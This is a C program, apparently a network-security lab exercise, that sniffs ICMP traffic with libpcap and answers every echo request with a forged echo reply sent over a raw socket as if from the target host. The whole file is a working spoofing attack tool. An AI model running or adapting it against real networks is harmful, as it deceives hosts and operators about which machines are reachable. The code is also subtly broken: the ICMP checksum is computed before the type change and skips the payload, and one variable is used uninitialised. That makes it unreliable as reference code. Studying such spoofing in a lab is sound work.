#include <pcap.h>
#include <stdio.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/tcp.h>
#include <time.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

unsigned short in_cksum(unsigned short *buf, int length)
  {
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp = 0;

    /*
     * The algorithm uses a 32 bit accumulator (sum), adds
     * sequential 16 bit words to it, and at the end, folds back all
     * the carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }

    /* treat the odd byte at the end, if any */
    if (nleft == 1)
    {
      *(u_char *)(&temp) = *(u_char *)w;
      sum += temp;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); // add hi 16 to low 16
    sum += (sum >> 16);                 // add carry
    return (unsigned short)(~sum);
  }


/* Ethernet header */
struct ethheader
{
  u_char ether_dhost[ETHER_ADDR_LEN]; /* destination host address */
  u_char ether_shost[ETHER_ADDR_LEN]; /* source host address */
  u_short ether_type;                 /* IP? ARP? RARP? etc */
};


/* IP Header */
struct ipheader
{
  unsigned char iph_ihl : 4,       // IP header length
      iph_ver : 4;                 // IP version
  unsigned char iph_tos;           // Type of service
  unsigned short int iph_len;      // IP Packet length (data + header)
  unsigned short int iph_ident;    // Identification
  unsigned short int iph_flag : 3, // Fragmentation flags
      iph_offset : 13;             // Flags offset
  unsigned char iph_ttl;           // Time to Live
  unsigned char iph_protocol;      // Protocol type
  unsigned short int iph_chksum;   // IP datagram checksum
  struct in_addr iph_sourceip;     // Source IP address
  struct in_addr iph_destip;       // Destination IP address
};

/*ICMP STRUCT*/
struct icmpheader
{
  unsigned char icmp_type;        // ICMP message type
  unsigned char icmp_code;        // Error code
  unsigned short int icmp_chksum; // Checksum for ICMP Header and data
  unsigned short int icmp_id;     // Used for identifying request
  unsigned short int icmp_seq;    // Sequence number
};


void send_raw_ip_packet(struct ipheader *ip)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
             &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, ip, ntohs(ip->iph_len), 0,
         (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}




void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet)
{
  
  struct ethheader *eth = (struct ethheader *)packet;

  // Find where the IP header starts, and typecast it to the IP Header structure
  struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
  unsigned short iphdrlen = (ip->iph_ihl) * 4;
  
  
  if (ntohs(eth->ether_type) == 0x0800)
  { // 0x0800 is IP type
    

    // Find where the IP header starts, and typecast it to the IP Header structure
    struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));
    unsigned short iphdrlen = (ip->iph_ihl) * 4;
  

    printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));
    printf("         To: %s\n", inet_ntoa(ip->iph_destip));
    
    /* determine protocol */
    switch (ip->iph_protocol)
    {
    case IPPROTO_TCP:
      printf("   Protocol: TCP\n");
      return;
    case IPPROTO_UDP:
      printf("   Protocol: UDP\n");
      return;
    case IPPROTO_ICMP:
    {


    

      printf("   Protocol: ICMP\n");
      /*SPOOFING TIME BABY*/
      const char buffer[1500];
      int ip_header_len = ip->iph_ihl * 4;
      struct icmpheader *icmp =(struct icmpheader *)((u_char *)ip +
                                                 ip_header_len);
                                            
        if(icmp->icmp_type==0) // spoof only icmp requests
        {
            return;

        }


      // Step 1: Make a copy from the original packet  
      memset((char *)buffer, 0, 1500);
      memcpy((char *)buffer, ip, ntohs(ip->iph_len));
      struct ipheader *newip = (struct ipheader *)buffer;
      struct icmpheader *newicmp= (struct icmpheader *)(buffer+ip_header_len);
      char *data = (char *)newicmp + sizeof(struct icmpheader);

      // Step 2: Construct the icmp payload, keep track of payload size
        const char *msg = "This is a spoofed reply!\n";
        int data_len = strlen(msg);
        strncpy(data, msg, data_len);

     // Step 3: Construct the icmp Header
        newicmp->icmp_chksum=in_cksum((unsigned short *)newicmp,
                               sizeof(struct icmpheader));
        newicmp->icmp_type=0;

      // Step 4: Construct the IP header (no change for other fields)
    newip->iph_sourceip = ip->iph_destip;
    newip->iph_destip = ip->iph_sourceip;
    newip->iph_ttl = 118; // Rest the TTL field
    newip->iph_len = htons(sizeof(struct ipheader) +
                           sizeof(struct icmpheader) + data_len);

    // Step 5: Send out the spoofed IP packet
    send_raw_ip_packet(newip);   
    


      return;
    }
    default:
      printf("   Protocol: others\n");
      return;
    }
  }
}

  int main()
{
  pcap_t *handle;
  char errbuf[PCAP_ERRBUF_SIZE];
  struct bpf_program fp;
  char filter_exp[] = "icmp";
  bpf_u_int32 net;

  // Step 1: Open live pcap session on NIC with name eth3
  handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);

  // Step 2: Compile filter_exp into BPF psuedo-code
  pcap_compile(handle, &fp, filter_exp, 0, net);
  pcap_setfilter(handle, &fp);

  // Step 3: Capture packets
  pcap_loop(handle, -1, got_packet, NULL);

  pcap_close(handle); // Close the handle

  return 0;
}


